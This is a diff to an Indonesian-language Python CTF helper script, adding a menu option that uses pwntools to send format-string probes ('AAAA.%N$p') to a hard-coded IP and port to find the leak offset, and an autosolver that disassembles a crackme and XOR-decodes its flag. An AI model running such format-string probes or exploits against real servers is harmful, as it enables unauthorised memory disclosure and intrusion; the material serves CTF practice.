@@ -11,6 +11,10 @@ import urllib.request
 import urllib.parse
 import base64
 import hashlib
+import re
+import struct
+import subprocess
+from pwn import *
 
 def banner():
     print("=" * 50)
@@ -168,6 +172,178 @@ def menu_linux_commands():
     print(cheatsheet)
     print("="*60)
 
+def exploit():
+# Sembunyikan pesan log agar terminal bersih
+    context.log_level = 'error'
+
+    print("[*] Memulai pemindaian memori server secara presisi...")
+    print("[*] Mencari posisi penanda teks 'AAAA' (0x41414141)...")
+
+    # Kita periksa posisi dari urutan ke-1 sampai 30 satu per satu
+    for offset in range(1, 31):
+        try:
+            # Hubungi server untuk setiap pengujian
+            io = remote('103.127.98.249', 10003, timeout=1)
+            
+            # Kirim teks penanda diikuti nomor posisi memori spesifik
+            # Contoh: AAAA.%6$p (hanya membaca memori urutan ke-6)
+            payload = f"AAAA.%{offset}$p".encode()
+            io.sendline(payload)
+            
+            # Baca balasan singkat dari server
+            respon = io.recvall(timeout=1).decode('utf-8', errors='ignore').strip()
+            
+            # Tampilkan aktivitas agar Anda tahu skrip sedang berjalan
+            print(f" -> Posisi {offset}: {respon}")
+            
+            # Periksa apakah representasi hex dari AAAA muncul di posisi ini
+            if "41414141" in respon:
+                print(f"\n[+] DATA KETEMU!")
+                print(f"[+] Nilai Offset Format String yang akurat adalah: {offset}")
+                io.close()
+                break
+                
+            io.close()
+        except Exception:
+            # Jika satu koneksi timeout atau putus, abaikan dan lanjut ke angka berikutnya
+            pass
+    else:
+        print("\n[-] Pemindaian selesai. Server tidak mengembalikan nilai hex penanda.")
+
+# Autosolver
+def autosolver():
+    def objdump(binary):
+        out = subprocess.run(
+            ["objdump", "-d", binary, "-M", "intel"],
+            capture_output=True, text=True
+        ).stdout
+        return out
+
+
+    def extract_main(asm_text):
+        m = re.search(r"<main>:\n(.*?)\n\n", asm_text, re.S)
+        if not m:
+            m = re.search(r"<main>:\n(.*)", asm_text, re.S)
+        return m.group(1)
+
+
+    def find_xor_key(main_asm):
+        m = re.search(r"xor\s+e\w\w,0x([0-9a-f]+)", main_asm)
+        if m:
+            return int(m.group(1), 16)
+        return None
+
+
+    def find_immediate_chunks(main_asm):
+        """
+        Ambil semua instruksi yang menulis immediate constant ke stack:
+        movabs rax,0x...   (8 byte, harus dipasangkan ke 'mov QWORD PTR [..],rax' selanjutnya)
+        mov QWORD PTR [..],0x...   (8 byte langsung kalau imm cukup kecil - biasanya tidak terjadi untuk imm64)
+        mov DWORD PTR [..],0x...   (4 byte)
+        mov WORD PTR [..],0x...    (2 byte)
+        mov BYTE PTR [..],0x...    (1 byte)
+        Mengembalikan list of (address:int, bytes)
+        urut berdasarkan address instruksi.
+        """
+        chunks = []
+
+        lines = main_asm.splitlines()
+        pending = {} 
+
+        line_re = re.compile(r"^\s*([0-9a-f]+):\s+(?:[0-9a-f]{2}\s+)+\s*(.*)$")
+
+        for line in lines:
+            m = line_re.match(line)
+            if not m:
+                continue
+            addr = int(m.group(1), 16)
+            instr = m.group(2).strip()
+
+            m2 = re.match(r"movabs\s+(r\w\w),0x([0-9a-f]+)", instr)
+            if m2:
+                reg, imm_hex = m2.group(1), m2.group(2)
+                pending[reg] = struct.pack("<Q", int(imm_hex, 16))
+                continue
+
+            m3 = re.match(r"mov\s+QWORD PTR \[.*?\],(r\w\w)$", instr)
+            if m3:
+                reg = m3.group(1)
+                if reg in pending:
+                    chunks.append((addr, pending.pop(reg)))
+                continue
+
+            m4 = re.match(r"mov\s+DWORD PTR \[.*?\],0x([0-9a-f]+)", instr)
+            if m4:
+                chunks.append((addr, struct.pack("<I", int(m4.group(1), 16))))
+                continue
+
+            m5 = re.match(r"mov\s+WORD PTR \[.*?\],0x([0-9a-f]+)", instr)
+            if m5:
+                chunks.append((addr, struct.pack("<H", int(m5.group(1), 16))))
+                continue
+
+            m6 = re.match(r"mov\s+BYTE PTR \[.*?\],0x([0-9a-f]+)", instr)
+            if m6:
+                chunks.append((addr, struct.pack("<B", int(m6.group(1), 16))))
+                continue
+
+        chunks.sort(key=lambda x: x[0])
+        return chunks
+
+
+    def find_compare_length(main_asm):
+        matches = re.findall(r"cmp\s+eax,0x([0-9a-f]+)\n\s+[0-9a-f]+:\s+(?:[0-9a-f]{2}\s+)+jbe", main_asm)
+        if matches:
+            return int(matches[-1], 16) + 1  
+        return None
+
+
+    def main():
+        if len(sys.argv) != 2:
+            print(f"Usage: {sys.argv[0]} <path_to_crackme_binary>")
+            sys.exit(1)
+
+        binary = sys.argv[1]
+        asm = objdump(binary)
+        main_asm = extract_main(asm)
+
+        key = find_xor_key(main_asm)
+        if key is None:
+            print("[-] Gak ketemu XOR key otomatis, cek manual ya.")
+            sys.exit(1)
+        print(f"[+] XOR key ditemukan: 0x{key:02x}")
+
+        chunks = find_immediate_chunks(main_asm)
+        if not chunks:
+            print("[-] Gak ketemu chunk encoded constant, cek manual ya.")
+            sys.exit(1)
+
+        encoded = b"".join(data for _, data in chunks)
+        print(f"[+] Encoded bytes (raw, {len(encoded)} byte): {encoded.hex()}")
+
+        cmp_len = find_compare_length(main_asm)
+        if cmp_len:
+            print(f"[+] Panjang flag asli (dari cmp loop): {cmp_len}")
+            encoded = encoded[:cmp_len]
+
+        flag_bytes = bytes([b ^ key for b in encoded])
+        try:
+            flag = flag_bytes.decode()
+        except UnicodeDecodeError:
+            flag = None
+
+        print(f"[+] Candidate flag bytes: {flag_bytes}")
+        if flag:
+            print(f"[+] Candidate flag: {flag}")
+
+            # auto verify
+            result = subprocess.run([binary, flag], capture_output=True, text=True)
+            print(f"[+] Verifikasi run binary -> stdout: {result.stdout.strip()!r}")
+
+
+    if __name__ == "__main__":
+        main()
+
 # ==========================================
 # MAIN LOOP
 # ==========================================
@@ -178,9 +354,11 @@ def main():
         print("2. Web Exploitation (Cookie/Parameter Brute Force)")
         print("3. Cryptography (Base64, Custom Caesar/ROT, Hashing)")
         print("4. Tampilkan Semua Command Linux Berguna (Cheat Sheet)")
-        print("5. Keluar")
+        print("5. exploit")
+        print("6. autosolver reverse engineering")
+        print("7. Keluar")
         
-        pilihan = input("\nPilih opsi (1-5): ").strip()
+        pilihan = input("\nPilih opsi (1-6): ").strip()
         
         if pilihan == "1":
             menu_ip_checker()
@@ -191,6 +369,11 @@ def main():
         elif pilihan == "4":
             menu_linux_commands()
         elif pilihan == "5":
+            print("[*] Memulai eksploitasi otomatis Format String untuk target server...")
+            exploit()
+        elif pilihan == "6":
+            autosolver()
+        elif pilihan == "7":
             print(f"[*] Keluar dari program. Dibuat oleh @gnadjaaa_. Semoga sukses CTF-nya!")
             sys.exit(0)
         else:
